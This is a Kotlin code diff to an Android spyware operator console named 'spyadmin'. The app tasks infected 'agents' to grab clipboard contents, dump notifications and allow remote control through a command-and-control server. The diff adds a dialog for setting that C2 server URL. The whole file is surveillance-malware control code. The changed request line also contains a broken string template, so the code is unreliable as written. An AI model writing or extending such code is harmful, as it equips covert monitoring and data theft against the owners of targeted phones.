@@ -1,6 +1,7 @@
 package com.spyadmin
 
 import android.content.Intent
+import android.content.SharedPreferences
 import android.os.Bundle
 import android.view.LayoutInflater
 import android.view.View
@@ -27,10 +28,13 @@ class AdminActivity : AppCompatActivity() {
         .build()
     private lateinit var adapter: AgentAdapter
     private var selectedAgent: Agent? = null
+    private lateinit var prefs: SharedPreferences
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_admin)
+
+        prefs = getSharedPreferences("admin_config", MODE_PRIVATE)
 
         val rvAgents = findViewById<RecyclerView>(R.id.rvAgents).apply {
             layoutManager = LinearLayoutManager(this@AdminActivity)
@@ -55,8 +59,33 @@ class AdminActivity : AppCompatActivity() {
         findViewById<Button>(R.id.btnTaskClipboard).setOnClickListener { sendTask("clipboard", mapOf("action" to "get")) }
         findViewById<Button>(R.id.btnTaskNotifications).setOnClickListener { sendTask("notifications", mapOf("action" to "dump")) }
         findViewById<Button>(R.id.btnRemoteControl).setOnClickListener { openRemoteControl() }
+        findViewById<Button>(R.id.btnConfigC2).setOnClickListener { showC2Config() }
 
         loadAgents()
+    }
+
+    private fun getC2Url(): String {
+        return prefs.getString("c2_url", "https://c2.example.com:8443")
+    }
+
+    private fun showC2Config() {
+        val currentUrl = getC2Url()
+        val input = android.widget.EditText(this).apply {
+            hint = "C2 Server URL (e.g., https://your-server.com:8443)"
+            setText(currentUrl)
+        }
+        android.app.AlertDialog.Builder(this)
+            .setTitle("Configure C2 Server")
+            .setView(input)
+            .setPositiveButton("Save") { _, _ ->
+                val newUrl = input.text.toString().trim()
+                if (newUrl.isNotEmpty()) {
+                    prefs.edit().putString("c2_url", newUrl).apply()
+                    Toast.makeText(this@AdminActivity, "C2 URL saved", Toast.LENGTH_SHORT).show()
+                }
+            }
+            .setNegativeButton("Cancel", null)
+            .show()
     }
 
     private fun loadAgents() {
@@ -91,7 +120,7 @@ class AdminActivity : AppCompatActivity() {
     }
 
     private fun request(method: String, endpoint: String, body: Any? = null, callback: (String) -> Unit) {
-        val url = "https://c2.example.com:8443$endpoint"
+        val url = "$getC2Url()$endpoint"
         val requestBody = body?.let { it.toJson().toRequestBody("application/json".toMediaType()) }
         val request = Request.Builder().url(url).method(method, requestBody).build()
         client.newCall(request).enqueue(object : okhttp3.Callback {
